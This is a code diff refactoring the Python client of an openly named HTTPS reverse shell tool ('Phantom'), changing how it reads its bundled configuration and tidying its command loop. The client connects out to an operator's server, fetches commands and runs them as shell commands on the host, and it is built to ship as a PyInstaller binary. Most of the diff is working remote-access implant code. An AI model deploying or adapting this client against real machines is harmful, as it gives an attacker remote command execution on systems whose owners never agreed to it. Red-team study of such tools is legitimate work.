@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
-# https://github.com/EONRaider/BCA-HTTPS-Reverse-Shell
+# https://github.com/EONRaider/BCA-Phantom
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
-import configparser
 import getpass
 import http.client
 import platform
@@ -56,10 +55,9 @@ class Client:
         """
         request_body: bytes = parse.urlencode(request_body).encode()
         url = request.Request(self.server_url, data=request_body)
-        return (request
-                .urlopen(url=url, context=self._ssl_context)
-                .read()
-                .decode())
+        with request.urlopen(url=url, context=self._ssl_context) as r:
+            response = r.read().decode()
+        return response
 
     def execute(self) -> None:
         self._commands.open_session()
@@ -68,20 +66,22 @@ class Client:
                 response: str = self.post({"prompt": self._shell_prompt})
             except (http.client.RemoteDisconnected, KeyboardInterrupt):
                 break
-            cmd, *args = response.split(" ")
+            cmd_name, *cmd_args = response.split(" ")
             try:
-                if len(cmd) == 0:    # cmd is an empty string
+                if len(cmd_name) == 0:  # cmd_name is an empty string
                     continue
-                else:                # cmd is a method of ClientCommands
-                    getattr(self._commands, cmd)(args)
-            except AttributeError:   # cmd is a standard shell command
+                else:  # cmd_name is a method of ClientCommands
+                    getattr(self._commands, cmd_name)(cmd_args)
+            except AttributeError:  # cmd_name is a shell command
                 self._commands.shell(response)
 
 
 if __name__ == "__main__":
     import argparse
 
-    parser = argparse.ArgumentParser(description="HTTPS Reverse Shell Client")
+    parser = argparse.ArgumentParser(
+        description="Phantom - HTTPS Reverse Shell Client"
+    )
     parser.add_argument(
         "--host",
         type=str,
@@ -104,33 +104,24 @@ if __name__ == "__main__":
 
     _args = parser.parse_args()
 
-    try:
+    if not all((_args.host, _args.port)):
         '''Client is executed as a binary compiled by PyInstaller. All 
-        configuration options are read from the 'client.cfg' file that 
-        is bundled in the binary during the build process defined in the 
-        'build.py' file. In this case the location of all added data 
-        will be a temporary directory set by sys._MEIPASS. If such 
-        directory does not exist then an AttributeError is raised.'''
-        tmp_dir = Path(sys._MEIPASS)
-        config = configparser.ConfigParser()
-        config_file = config.read(tmp_dir.joinpath("client.cfg"))
-        if len(config_file) == 0:
-            raise SystemExit("Cannot initialize client without specification "
-                             "of a host and port to connect to.")
-        client_cfg = config["CLIENT"]
-        _ca_cert = tmp_dir.joinpath(client_cfg.get("ca-certificate")) \
-            if _args.ca_cert is None else _args.ca_cert
-        Client(
-            server_address=client_cfg.get("host"),
-            server_port=client_cfg.getint("port"),
-            ca_cert=_ca_cert
-        ).execute()
-    except AttributeError:
+        configuration options are read from the 'config.py' file that 
+        is created and bundled in the binary during the build process 
+        defined by 'build.py'. The CA certificate file is located by 
+        PyInstaller in the directory with path defined by sys._MEIPASS.
+        '''
+        import importlib
+        args = importlib.import_module("config")
+        args.ca_cert = Path(sys._MEIPASS).joinpath(args.ca_cert)
+    else:
         '''Client is executed from source code by the system interpreter 
         for development purposes. All configuration options are parsed 
         from the CLI.'''
-        Client(
-            server_address=_args.host,
-            server_port=_args.port,
-            ca_cert=_args.ca_cert
-        ).execute()
+        args = _args
+
+    Client(
+        server_address=args.host,
+        server_port=int(args.port),
+        ca_cert=args.ca_cert
+    ).execute()
